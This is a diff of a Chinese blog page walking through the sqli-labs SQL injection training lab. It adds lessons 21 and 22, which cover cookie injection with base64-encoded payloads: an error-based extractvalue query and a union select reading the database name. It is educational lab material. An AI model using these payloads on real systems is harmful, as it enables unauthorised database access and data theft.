@@ -12,7 +12,7 @@
 <meta name="keywords" content="学习">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqli-labs学习（lesson1-lesson20）">
-<meta property="og:url" content="http://yoursite.com/2019/01/17/sqli-labs学习（lesson1-lesson20）/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/01/17/sqli-labs学习（lesson1-lesson22）/index.html">
 <meta property="og:site_name" content="Wh1te">
 <meta property="og:description" content="lesson1：插入单引号报错id被单引号包裹，确认字段数  ?id=1’ order by 3–+">
 <meta property="og:locale" content="default">
@@ -45,7 +45,10 @@
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-7aa72f550de5cdce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-58c35ddffaa57ed8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-688ec31978908711.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2019-01-22T08:25:48.058Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-cbe7f60b774fa86d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-1b483098d52c9c3e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-cd7ab724744bde04.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-01-24T16:36:11.467Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs学习（lesson1-lesson20）">
 <meta name="twitter:description" content="lesson1：插入单引号报错id被单引号包裹，确认字段数  ?id=1’ order by 3–+">
@@ -199,7 +202,7 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-sqli-labs学习（lesson1-lesson20）" class="article article-type-post " itemscope="" itemprop="blogPost">
+            <article id="post-sqli-labs学习（lesson1-lesson22）" class="article article-type-post " itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
@@ -211,7 +214,7 @@
   
 
         
-        <a href="/2019/01/17/sqli-labs学习（lesson1-lesson20）/" class="archive-article-date">
+        <a href="/2019/01/17/sqli-labs学习（lesson1-lesson22）/" class="archive-article-date">
   	<time datetime="2019-01-17T14:42:33.030Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-17</time>
 </a>
         
@@ -336,6 +339,16 @@
 <p>uname =  ‘ union select 1 , 2 , database()#</p>
 </blockquote>
 <p><img src="https://upload-images.jianshu.io/upload_images/15184404-688ec31978908711.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>其他同理</p>
+<h1 id="lesson21"><a href="#lesson21" class="headerlink" title="lesson21"></a>lesson21</h1><p>和上题一样，属于cookie注入，先看源码<br><img src="https://upload-images.jianshu.io/upload_images/15184404-cbe7f60b774fa86d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>和上题基本一样，之不过给用户名（uname）进行了base64加密，对注入语句进行加密即可</p>
+<blockquote>
+<p>注入语句:<br>admin1’)and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#<br>加密后payload:<br>YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2VkaXIpLDB4N2UpKSM=</p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-1b483098d52c9c3e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>报错注入</p>
+<h1 id="lesson22"><a href="#lesson22" class="headerlink" title="lesson22"></a>lesson22</h1><p>与上题基本一样，’改成”即可</p>
+<blockquote>
+<p>“ union select 1,2,database()#<br>payload:IiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj</p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-cd7ab724744bde04.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
 
       
 
@@ -431,7 +444,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/01/17/sqli-labs学习（lesson1-lesson20）/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/01/17/sqli-labs学习（lesson1-lesson22）/" alt="微信分享二维码">
     </div>
 </div>
 
